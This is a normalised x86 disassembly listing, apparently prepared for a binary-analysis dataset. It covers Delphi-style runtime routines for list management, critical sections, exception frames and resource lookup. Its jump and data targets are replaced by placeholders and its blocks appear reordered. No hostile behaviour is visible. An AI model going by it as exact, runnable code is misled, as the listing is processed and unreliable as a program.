test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403278
mov dl 0x1
mov eax [ r-xdata ]
call sub_403278
mov [ edi + 0x4 ] eax
lea eax [ edi + 0x8 ]
push eax
call InitializeCriticalSection
mov ecx [ r-xdata ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_417488
mov esi eax
mov eax [ edi + 0x4 ]
mov edx esi
call sub_418778
mov [ esi + 0x10 ] 0x1
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_41782c
push ebx
push esi
push edi
push ebp
call sub_403674
mov ebx edx
mov esi eax
lea eax [ esi + 0x8 ]
push eax
call DeleteCriticalSection
mov eax [ esi + 0x4 ]
mov ebp [ eax + 0x8 ]
dec ebp
test ebp ebp
jl r-xdata
mov eax [ esi + 0x4 ]
call sub_4032a8
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403298
test bl bl
jle r-xdata
inc ebp
xor edi edi
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
mov eax [ esi + 0x4 ]
mov edx edi
call sub_4188d4
call sub_4032a8
inc edi
dec ebp
jne r-xdata
sub_417888
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov ebp eax
xor esi esi
mov eax [ ebp + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax esi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
mov eax [ ebp + 0x4 ]
mov edx edi
call sub_4188d4
mov edx [ esp ]
push edx
mov ecx esi
mov edx eax
mov eax [ r-xdata ]
call sub_417418
mov esi eax
inc edi
dec ebx
jne r-xdata
sub_4178cc
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov ebp eax
xor edi edi
mov eax [ ebp + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax edi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
test edi edi
jne r-xdata
mov edx [ esp ]
call sub_417544
mov edi eax
inc esi
dec ebx
jne r-xdata
mov eax [ ebp + 0x4 ]
mov edx esi
call sub_4188d4
cmp [ eax + 0x10 ] 0x0
je r-xdata
sub_417910
push ebp
mov ebp esp
add esp 0xfffffef4
xor eax eax
mov [ ebp - 0x10c ] eax
xor eax eax
push ebp
push sub_417993
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x108 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4031f8
lea eax [ ebp - 0x108 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x4
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0x10c ]
mov eax [ rw-data ]
call sub_405df8
mov ecx [ ebp - 0x10c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba0c
call sub_403a74
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41799a
lea eax [ ebp - 0x10c ]
call sub_404038
retn
sub_4179a0
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_417888
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
call sub_4173ac
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
push ebp
call sub_417910
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
inc eax
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0x0
inc [ ebp - 0x14 ]
dec [ ebp - 0x18 ]
jne r-xdata
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx [ ebp - 0x14 ]
call sub_4188d4
mov edi eax
cmp edi [ ebp - 0x10 ]
je r-xdata
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_4188d4
mov esi eax
mov edx [ ebp - 0xc ]
mov eax esi
call sub_4034d4
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_417888
cmp eax [ ebp - 0x10 ]
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_4187c4
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x4 ]
mov edx esi
call sub_418778
sub_417a8c
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov edi eax
mov [ esp ] 0x1
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ esp ] 0x0
inc ebx
xor esi esi
mov al [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx esi
call sub_4188d4
mov edx ebp
call sub_417690
test al al
jne r-xdata
sub_417ad0
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov ecx ebp
mov dl 0x1
mov eax [ r-xdata ]
call sub_417488
mov edx eax
mov eax [ edi + 0x4 ]
call sub_418778
inc ebx
xor esi esi
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx esi
call sub_4188d4
mov eax [ eax + 0xc ]
mov edx ebp
call sub_418930
test eax eax
jge r-xdata
sub_417b2c
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_4188d4
mov esi eax
mov edx ebp
mov eax esi
call sub_4176c8
mov eax [ esi + 0xc ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov eax esi
call sub_4032a8
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_4187c4
sub_417b7c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
test dl dl
je r-xdata
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_403278
mov dl 0x1
mov eax [ r-xdata ]
call sub_403278
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
mov eax [ rw-data ]
call sub_417a68
xor eax eax
push ebp
push sub_417c7b
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0xc ] 0x0
jne r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0xc ] eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
inc esi
xor edi edi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417c82
mov eax [ rw-data ]
call sub_417b20
retn
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_418778
inc esi
xor edi edi
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov edx edi
call sub_4188d4
mov ebx eax
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_4175a4
test al al
je r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_418778
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov edx edi
call sub_4188d4
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
je r-xdata
sub_417c82
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_417ca8
push ebx
push esi
call sub_403674
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
call sub_4032a8
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403298
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
sub_417cd8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ rw-data ]
call sub_417a68
xor edx edx
push ebp
push sub_417d4f
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_417b20
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
call sub_403b20
jmp r-xdata
mov eax [ edi + 0x4 ]
mov edx esi
call sub_4188d4
mov edx [ ebp - 0x4 ]
call sub_417544
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_417d6c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
xor edx edx
mov [ ebp - 0xc ] edx
mov ebx eax
xor eax eax
push ebp
push sub_417dcc
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405df8
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba0c
call sub_403a74
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417dd3
lea eax [ ebp - 0xc ]
call sub_404038
retn
sub_417dd8
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_417a68
xor eax eax
push ebp
push sub_417e1e
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ rw-data ]
call sub_4178cc
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417e25
mov eax [ rw-data ]
call sub_417b20
retn
sub_417e2c
push ebx
push esi
mov esi eax
mov eax esi
call sub_417dd8
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov eax esi
call sub_417d6c
sub_417e4c
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_417a68
xor eax eax
push ebp
push sub_417eb1
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_417a8c
test al al
je r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_417a74
cmp ebx [ r-xdata ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417eb8
mov eax [ rw-data ]
call sub_417b20
retn
mov eax ebx
call sub_403234
mov ebx eax
sub_417ebc
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_417a68
xor eax eax
push ebp
push sub_417efe
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ rw-data ]
call sub_417b2c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417f05
mov eax [ rw-data ]
call sub_417b20
retn
sub_417f08
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_417a68
xor eax eax
push ebp
push sub_417f4a
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ rw-data ]
call sub_417ad0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417f51
mov eax [ rw-data ]
call sub_417b20
retn
sub_417f54
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
call sub_417a68
xor eax eax
push ebp
push sub_417f9b
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
mov edx ebx
mov eax [ rw-data ]
call sub_4179a0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417fa2
mov eax [ rw-data ]
call sub_417b20
retn
sub_417fa8
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_417a68
xor eax eax
push ebp
push sub_417ff6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0x4 ] eax
mov edx ebx
mov eax [ rw-data ]
call sub_41776c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417ffd
mov eax [ rw-data ]
call sub_417b20
retn
sub_41805c
push ebp
mov ebp esp
test dl dl
je r-xdata
mov [ eax + 0x4 ] ecx
mov ecx [ ebp + 0xc ]
mov [ eax + 0x8 ] ecx
mov ecx [ ebp + 0x8 ]
mov [ eax + 0xc ] ecx
test dl dl
je r-xdata
add esp 0xfffffff0
call sub_40360c
pop ebp
retn 0x8
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_418094
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push esi
push edi
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_41805c
mov edx eax
mov eax [ rw-data ]
call sub_418c4c
pop edi
pop esi
pop ebx
retn
sub_4180c0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi eax
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
call sub_418cd4
mov esi eax
xor edx edx
push ebp
push sub_41812a
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx [ esi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_418d38
retn
mov edx ebx
mov eax esi
call sub_4188d4
cmp edi [ eax + 0x4 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov eax [ eax + 0xc ]
mov [ ebp - 0x4 ] eax
call sub_403b20
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41813c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi eax
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
call sub_418cd4
mov esi eax
xor edx edx
push ebp
push sub_4181a6
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx [ esi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_418d38
retn
mov edx ebx
mov eax esi
call sub_4188d4
cmp edi [ eax + 0x4 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov eax [ eax + 0x8 ]
mov [ ebp - 0x4 ] eax
call sub_403b20
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4181b8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov edi eax
mov esi [ ebp + 0x8 ]
test esi esi
jl r-xdata
xor eax eax
inc esi
lea ebx [ ecx + 0x4 ]
add ebx 0x8
dec esi
jne r-xdata
mov al 0x1
mov edx [ ebp - 0x4 ]
mov ecx [ ebx - 0x4 ]
mov [ edx ] ecx
jmp r-xdata
mov edx edi
mov eax [ ebx ]
call sub_408048
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_4181f8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi [ ebp + 0x8 ]
test esi esi
jl r-xdata
mov [ ebp - 0x5 ] 0x0
inc esi
mov ebx [ ebp - 0x4 ]
add ebx 0x8
dec esi
jne r-xdata
mov [ ebp - 0x5 ] 0x1
mov eax edi
mov edx [ ebx + 0x4 ]
call sub_40408c
jmp r-xdata
cmp eax [ ebx ]
jne r-xdata
mov al [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_41823c
push ebx
push esi
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
mov esi ebx
mov edx esi
mov eax [ rw-data ]
call sub_418930
test eax eax
jge r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403278
mov [ rw-data ] eax
pop esi
pop ebx
retn
mov edx esi
mov eax [ rw-data ]
call sub_418778
sub_418294
push ebx
push esi
push edi
mov esi eax
xor eax eax
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx [ rw-data ]
mov ebx [ edx + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_4188d4
mov edi eax
mov eax esi
call edi
test eax eax
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_4182d4
push ebx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax ebx
call sub_418294
test eax eax
sete al
pop ebx
retn
mov eax ebx
call [ rw-data ]
pop ebx
retn
sub_4182f8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov edi eax
test ebx ebx
jne r-xdata
push 0xa
mov eax edi
call sub_4044f8
push eax
push ebx
call FindResourceA
test eax eax
setne al
test al al
je r-xdata
mov ebx [ rw-data ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
push edi
push 0xa
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_41b8ec
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41836c
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ esi ]
mov eax [ ebp - 0x4 ]
call sub_41b388
mov [ esi ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_4032a8
retn
sub_41837c
push ebx
call sub_406064
mov ebx [ eax + 0xc ]
test ebx ebx
jne r-xdata
call sub_406064
mov edx [ eax + 0x8 ]
mov eax ebx
call sub_418778
mov dl 0x1
mov eax [ r-xdata ]
call sub_403278
mov ebx eax
call sub_406064
mov [ eax + 0x8 ] ebx
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403278
mov ebx eax
call sub_406064
mov [ eax + 0xc ] ebx
sub_4183d4
push ebx
push esi
push edi
call sub_406064
mov edi [ eax + 0x8 ]
mov ebx [ edi + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_4188d4
mov edx [ eax ]
call [ edx + 0xc ]
inc esi
dec ebx
jne r-xdata
sub_418404
push ebx
push esi
call sub_406064
mov eax [ eax + 0x8 ]
call sub_4032a8
call sub_406064
mov ebx [ eax + 0xc ]
mov eax ebx
call sub_4189bc
mov esi eax
call sub_406064
mov [ eax + 0x8 ] esi
mov edx [ ebx + 0x8 ]
dec edx
mov eax ebx
call sub_4187c4
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
call sub_406064
xor edx edx
mov [ eax + 0xc ] edx
mov eax ebx
call sub_4032a8
sub_418460
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
xor edx edx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_4184f6
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
cmp esi [ r-xdata ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4184fd
lea eax [ ebp - 0x4 ]
call sub_404038
retn
mov eax [ ebp + 0x8 ]
cmp esi [ eax - 0x8 ]
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax esi
call sub_403234
call sub_418460
pop ecx
mov ebx eax
lea edx [ ebp - 0x104 ]
mov eax esi
call sub_4031f8
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_40429c
mov eax [ ebp - 0x4 ]
push eax
mov eax esi
call sub_4052e0
call sub_405330
mov edx eax
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x4 ]
pop eax
call sub_4182f8
or bl al
sub_418508
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor eax eax
push ebp
push sub_4185b6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x1c ]
and ax [ r-xdata ]
mov dx [ r-xdata ]
cmp dx ax
sete [ ebp - 0xa ]
cmp [ ebp - 0xa ] 0x0
je r-xdata
xor eax eax
push ebp
push sub_418597
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov eax [ ebp - 0x4 ]
call sub_4031f0
call sub_418460
pop ecx
mov [ ebp - 0x9 ] al
cmp [ ebp - 0xa ] 0x0
je r-xdata
call sub_41837c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41859e
cmp [ ebp - 0xa ] 0x0
je r-xdata
call sub_4183d4
retn
call sub_418404
sub_4185cc
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx ecx
mov esi edx
push 0x400
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41ba70
mov [ ebp - 0x4 ] eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1c ] ebx
xor eax eax
push ebp
push sub_418629
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_41ebf4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418630
mov eax [ ebp - 0x4 ]
call sub_4032a8
retn
sub_418638
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov [ ebp - 0x1 ] 0x0
mov eax ebx
call sub_4031f0
push eax
mov eax esi
call sub_4031f0
pop edx
cmp edx eax
jne r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax ebx
call sub_419748
push eax
mov eax esi
call sub_419748
pop edx
cmp edx eax
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403278
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_418745
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx edi
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_4185cc
mov dl 0x1
mov eax [ r-xdata ]
call sub_403278
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_418728
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebp + 0x8 ]
mov edx esi
mov eax [ ebp - 0xc ]
call sub_4185cc
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx ]
cmp edx [ esp + 0x4 ]
jne r-xdata
pop edx
pop eax
jne r-xdata
cmp eax [ esp ]
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
call sub_407fd4
test al al
jne r-xdata
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41872f
mov eax [ ebp - 0xc ]
call sub_4032a8
retn
mov al 0x1
sub_418758
push ebx
push esi
call sub_403674
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x8 ]
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
sub_418778
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x8 ]
cmp esi [ ebx + 0xc ]
jne r-xdata
mov eax [ ebx + 0x4 ]
mov [ eax + esi * 4 ] edi
inc [ ebx + 0x8 ]
test edi edi
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax esi
pop edi
pop esi
pop ebx
retn
xor ecx ecx
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_4187c4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_418860
cmp esi [ ebx + 0x8 ]
jl r-xdata
test edi edi
je r-xdata
sub eax esi
mov ecx eax
shl ecx 0x2
mov eax [ ebx + 0x4 ]
lea edx [ eax + esi * 4 ]
mov eax [ ebx + 0x4 ]
lea eax [ eax + esi * 4 + 0x4 ]
call sub_4028c8
mov edx esi
mov eax ebx
call sub_4188d4
mov edi eax
dec [ ebx + 0x8 ]
mov eax [ ebx + 0x8 ]
cmp esi eax
jge r-xdata
pop edi
pop esi
pop ebx
retn
mov cl 0x2
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_418828
push ebx
push esi
add esp 0xfffffff8
mov esi ecx
mov ebx edx
call sub_418824
push eax
mov [ esp + 0x4 ] esi
mov [ esp + 0x8 ] 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x0
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba0c
jmp sub_403a74
sub_418860
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi ecx
mov ebx edx
xor eax eax
push ebp
push sub_4188a8
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_405df8
mov edx [ ebp - 0x4 ]
mov ecx esi
mov eax [ r-xdata ]
call sub_418828
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4188af
lea eax [ ebp - 0x4 ]
call sub_404038
retn
sub_4188d4
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_418860
cmp esi [ ebx + 0x8 ]
jl r-xdata
mov eax [ ebx + 0x4 ]
mov eax [ eax + esi * 4 ]
pop esi
pop ebx
retn
sub_4188fc
mov edx [ eax + 0xc ]
cmp edx 0x40
jle r-xdata
cmp edx 0x8
jle r-xdata
mov ecx edx
test ecx ecx
jns r-xdata
mov ecx 0x4
mov ecx 0x10
jmp r-xdata
sar ecx 0x2
jmp r-xdata
add ecx 0x3
add ecx edx
mov edx ecx
call sub_418a90
retn
sub_418930
push ebx
xor ecx ecx
jmp r-xdata
cmp ecx [ eax + 0x8 ]
jge r-xdata
cmp ecx [ eax + 0x8 ]
jne r-xdata
mov ebx [ eax + 0x4 ]
cmp edx [ ebx + ecx * 4 ]
jne r-xdata
mov eax ecx
pop ebx
retn
or ecx 0xffffffff
inc ecx
sub_418950
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_418860
cmp esi [ ebx + 0x8 ]
jle r-xdata
mov eax [ ebx + 0x8 ]
cmp esi eax
jge r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax [ ebx + 0x8 ]
cmp eax [ ebx + 0xc ]
jne r-xdata
mov eax [ ebx + 0x4 ]
mov [ eax + esi * 4 ] edi
inc [ ebx + 0x8 ]
test edi edi
je r-xdata
sub eax esi
mov ecx eax
shl ecx 0x2
mov eax [ ebx + 0x4 ]
lea edx [ eax + esi * 4 + 0x4 ]
mov eax [ ebx + 0x4 ]
lea eax [ eax + esi * 4 ]
call sub_4028c8
pop edi
pop esi
pop ebx
retn
xor ecx ecx
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_4189c8
push ebx
push esi
push edi
push ebp
mov esi ecx
mov edi edx
mov ebx eax
cmp esi edi
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_418860
cmp esi [ ebx + 0x8 ]
jl r-xdata
mov edx edi
mov eax ebx
call sub_4188d4
mov ebp eax
mov eax [ ebx + 0x4 ]
xor edx edx
mov [ eax + edi * 4 ] edx
mov edx edi
mov eax ebx
call sub_4187c4
